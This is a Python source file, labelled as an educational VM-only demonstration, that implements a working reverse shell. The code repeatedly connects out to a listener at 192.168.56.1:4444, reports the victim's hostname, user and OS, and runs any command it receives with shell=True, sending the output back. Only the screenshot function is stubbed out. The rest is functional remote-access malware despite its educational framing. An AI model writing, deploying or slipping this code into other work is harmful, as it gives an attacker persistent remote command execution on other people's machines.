"""
Reverse Shell Module
Educational demonstration - VM environment only
"""

import socket
import subprocess
import os
import sys
import time
import platform

class ReverseShell:
    def __init__(self, server_ip='192.168.56.1', server_port=4444):
        self.server_ip = server_ip
        self.server_port = server_port
        self.connected = False
        self.system = platform.system()
        
    def connect(self):
        """Establish reverse shell connection"""
        retry_count = 0
        
        while True:
            try:
                # Create socket
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                print(f"[*] Attempting to connect to listener at {self.server_ip}:{self.server_port}")
                self.sock.connect((self.server_ip, self.server_port))
                
                self.connected = True
                retry_count = 0
                
                # Send system info
                self.send_system_info()
                
                # Main command loop
                while self.connected:
                    # Receive command
                    command = self.sock.recv(1024).decode().strip()
                    
                    if not command:
                        continue
                        
                    if command.lower() == 'exit':
                        break
                        
                    elif command.lower() == 'screenshot':
                        self.handle_screenshot()
                        
                    else:
                        # Execute command
                        self.execute_command(command)
                        
            except (socket.error, ConnectionRefusedError) as e:
                retry_count += 1
                if retry_count % 10 == 0:  # Print every 10 attempts
                    print(f"[*] Waiting for listener... (attempt {retry_count})")
                    
            except Exception as e:
                print(f"[!] Shell error: {e}")
                
            finally:
                self.connected = False
                try:
                    self.sock.close()
                except:
                    pass
                    
            # Wait before reconnecting
            time.sleep(10)
            
    def send_system_info(self):
        """Send basic system information"""
        try:
            info = f"""
[System Information]
OS: {platform.system()} {platform.release()}
Hostname: {socket.gethostname()}
User: {os.getenv('USERNAME') or os.getenv('USER')}
Architecture: {platform.machine()}
"""
            self.sock.send(info.encode())
        except:
            pass
            
    def execute_command(self, command):
        """Execute system command and return output"""
        try:
            # Change directory command
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:])
                    output = f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    output = f"Failed to change directory: {e}"
            else:
                # Execute command
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                output = result.stdout + result.stderr
                if not output:
                    output = "[Command executed successfully (no output)]"
                    
            self.sock.send(output.encode())
            
        except subprocess.TimeoutExpired:
            self.sock.send(b"[!] Command timed out")
        except Exception as e:
            self.sock.send(f"[!] Error: {e}".encode())
            
    def handle_screenshot(self):
        """Take screenshot (educational simulation)"""
        try:
            if self.system == "Windows":
                # Simulated screenshot for educational purposes
                self.sock.send(b"[*] Screenshot functionality is simulated for educational purposes")
            else:
                self.sock.send(b"[*] Screenshot functionality not available in this demo")
        except Exception as e:
            self.sock.send(f"[!] Screenshot failed: {e}".encode())